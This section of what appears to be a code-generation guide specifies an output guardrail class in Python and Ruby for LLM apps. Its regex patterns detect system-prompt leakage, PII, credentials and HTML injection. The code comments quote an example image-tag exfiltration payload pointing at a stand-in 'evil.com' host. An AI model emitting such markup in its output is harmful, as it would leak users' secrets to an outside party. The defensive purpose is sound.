
### 2C: Output Validation (always generated)

Satisfies: **O-11** (output validation exists), **O-13** (leakage detection),
**O-14** (sensitive data), **O-15** (HTML sanitization if rendered), **M-1** (guardrail layer)

Generate a class equivalent to `OutputGuardrail` from the defended-app. Include:

1. **System prompt leakage patterns** — detect phrases like "SYSTEM:", "SECURITY RULES:",
   "my instructions say", "I was told to", "API_KEY =" (O-13). Hard-block (return None).

2. **Sensitive data patterns** — SSN, credit card numbers, passwords in output, secret keys (O-14).
   Hard-block.

3. **HTML injection patterns** (only if HTML/Markdown render was selected) — `<script>`,
   `javascript:`, `<img src="http`, `<iframe`, `onerror=` (O-15). Hard-block.

4. **Output length cap** — truncate at a reasonable maximum (O-12).

```python
# WHY: [O-11, M-1] Output guardrail — sits between LLM and any downstream use.
#      Must be called on EVERY response before rendering, storing, or acting on output.
class OutputGuardrail:
    def process(self, text: str) -> str | None:
        # WHY: [O-13] Detect system prompt leakage — return None to block the response entirely
        for pattern in self._leakage_patterns:
            if pattern.search(text):
                return None

        # WHY: [O-14] Block any response containing PII or credential patterns
        for pattern in self._sensitive_patterns:
            if pattern.search(text):
                return None

        # WHY: [O-15] Only if output is rendered — block HTML injection vectors
        # (img tag exfiltration: <img src="https://evil.com/steal?data=SECRET">)
        for pattern in self._html_patterns:
            if pattern.search(text):
                return None

        return text[:3000]  # WHY: [O-12] Enforce output length cap
```

**Ruby:**
```ruby
# frozen_string_literal: true

# WHY: [O-11, M-1] Output guardrail — sits between LLM and any downstream use.
#      Must be called on EVERY response before rendering, storing, or acting on output.
class OutputGuardrail
  MAX_OUTPUT_LENGTH = 3000  # WHY: [O-12] Enforce output length cap

  LEAKAGE_PATTERNS = [
    # WHY: [O-13] Detect system prompt leakage — hard-block (return nil) if matched
    /SYSTEM:\s*You are/i,
    /SECURITY RULES:/i,
    /my instructions say/i,
    /I was told to/i,
    /API_KEY\s*=/,
  ].freeze

  SENSITIVE_PATTERNS = [
    # WHY: [O-14] Block any response containing PII or credential patterns
    /\b\d{3}-\d{2}-\d{4}\b/,                        # SSN
    /\b(?:\d{4}[- ]){3}\d{4}\b/,                    # credit card
    /password\s*[:=]\s*\S+/i,                        # password in output
    /(?:secret|api)[_-]?key\s*[:=]\s*\S+/i,         # secret/api key
  ].freeze

  HTML_INJECTION_PATTERNS = [
    # WHY: [O-15] Only include if output is rendered — block HTML injection vectors
    # (img tag exfiltration: <img src="https://evil.com/steal?data=SECRET">)
    /<script/i,
    /javascript\s*:/i,
    /<img\s+src\s*=\s*["']?https?:/i,
    /<iframe/i,
    /onerror\s*=/i,
  ].freeze

  def process(text)
    # WHY: [O-13] Detect system prompt leakage — return nil to block the response entirely
    LEAKAGE_PATTERNS.each { |p| return nil if p.match?(text) }

    # WHY: [O-14] Block any response containing PII or credential patterns
    SENSITIVE_PATTERNS.each { |p| return nil if p.match?(text) }

    # WHY: [O-15] Only if output is rendered — block HTML injection vectors
    HTML_INJECTION_PATTERNS.each { |p| return nil if p.match?(text) }

    text[0, MAX_OUTPUT_LENGTH]  # WHY: [O-12] Enforce output length cap
  end
end
```

---
